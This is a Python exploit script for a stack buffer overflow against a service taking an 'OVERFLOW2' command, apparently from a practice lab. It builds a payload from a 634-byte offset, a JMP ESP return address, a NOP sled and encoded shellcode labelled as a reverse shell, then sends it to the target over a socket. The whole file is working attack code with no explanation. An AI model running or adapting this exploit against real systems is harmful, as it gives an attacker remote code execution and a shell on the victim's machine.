#!/usr/bin/env python3

import socket, struct
host, port = '10.10.100.108', 1337
def p32(data):
        return struct.pack("<I", data)
command = b'OVERFLOW2 '

#this is where the register is 
offset = 634

#Length of buffer
length = 1000
#final payload (reverse shell)
shellcode =  b""
shellcode += b"\xfc\xbb\xa2\x54\xfd\x0b\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\x5e\xbc\x7f\x0b\x9e\x3d\xe0\x85"
shellcode += b"\x7b\x0c\x20\xf1\x08\x3f\x90\x71\x5c\xcc\x5b"
shellcode += b"\xd7\x74\x47\x29\xf0\x7b\xe0\x84\x26\xb2\xf1"
shellcode += b"\xb5\x1b\xd5\x71\xc4\x4f\x35\x4b\x07\x82\x34"
shellcode += b"\x8c\x7a\x6f\x64\x45\xf0\xc2\x98\xe2\x4c\xdf"
shellcode += b"\x13\xb8\x41\x67\xc0\x09\x63\x46\x57\x01\x3a"
shellcode += b"\x48\x56\xc6\x36\xc1\x40\x0b\x72\x9b\xfb\xff"
shellcode += b"\x08\x1a\x2d\xce\xf1\xb1\x10\xfe\x03\xcb\x55"
shellcode += b"\x39\xfc\xbe\xaf\x39\x81\xb8\x74\x43\x5d\x4c"
shellcode += b"\x6e\xe3\x16\xf6\x4a\x15\xfa\x61\x19\x19\xb7"
shellcode += b"\xe6\x45\x3e\x46\x2a\xfe\x3a\xc3\xcd\xd0\xca"
shellcode += b"\x97\xe9\xf4\x97\x4c\x93\xad\x7d\x22\xac\xad"
shellcode += b"\xdd\x9b\x08\xa6\xf0\xc8\x20\xe5\x9c\x3d\x09"
shellcode += b"\x15\x5d\x2a\x1a\x66\x6f\xf5\xb0\xe0\xc3\x7e"
shellcode += b"\x1f\xf7\x24\x55\xe7\x67\xdb\x56\x18\xae\x18"
shellcode += b"\x02\x48\xd8\x89\x2b\x03\x18\x35\xfe\x84\x48"
shellcode += b"\x99\x51\x65\x38\x59\x02\x0d\x52\x56\x7d\x2d"
shellcode += b"\x5d\xbc\x16\xc4\xa4\x57\x13\x12\x93\x9f\x4b"
shellcode += b"\x26\xdb\xfc\xa2\xaf\x3d\x68\xa5\xf9\x96\x05"
shellcode += b"\x5c\xa0\x6c\xb7\xa1\x7e\x09\xf7\x2a\x8d\xee"
shellcode += b"\xb6\xda\xf8\xfc\x2f\x2b\xb7\x5e\xf9\x34\x6d"
shellcode += b"\xf6\x65\xa6\xea\x06\xe3\xdb\xa4\x51\xa4\x2a"
shellcode += b"\xbd\x37\x58\x14\x17\x25\xa1\xc0\x50\xed\x7e"
shellcode += b"\x31\x5e\xec\xf3\x0d\x44\xfe\xcd\x8e\xc0\xaa"
shellcode += b"\x81\xd8\x9e\x04\x64\xb3\x50\xfe\x3e\x68\x3b"
shellcode += b"\x96\xc7\x42\xfc\xe0\xc7\x8e\x8a\x0c\x79\x67"
shellcode += b"\xcb\x33\xb6\xef\xdb\x4c\xaa\x8f\x24\x87\x6e"
shellcode += b"\xbf\x6e\x85\xc7\x28\x37\x5c\x5a\x35\xc8\x8b"
shellcode += b"\x99\x40\x4b\x39\x62\xb7\x53\x48\x67\xf3\xd3"
shellcode += b"\xa1\x15\x6c\xb6\xc5\x8a\x8d\x93\xc5\x2c\x72"
shellcode += b"\x1c"
#all possible bytes
all_chars = bytearray(range(1,256))
#bad bytes
bad_chars = [
b'\x23',
b'\x3c',
b'\x83',
b'\xba'
]
#where we want to jump to
jmp_esp = p32(0x625011BB)
#no operation slide for smooth transition
nop_sled = b'\x90' * 10

# replacing bad bytes from all bytes
for bad_char in bad_chars:
        all_chars = all_chars.replace(bad_char, b'')

#payload for buffer
payload = b''.join(
        [
        command,
        b'A' * offset,
        jmp_esp,
        nop_sled,
        shellcode,
        #keeping the payload an orginal size
        b'C' * (length - offset - len(jmp_esp) - len(shellcode) - len(nop_sled)),
        ])

with socket.socket() as s:
        s.connect((host, port))
        s.send(payload)
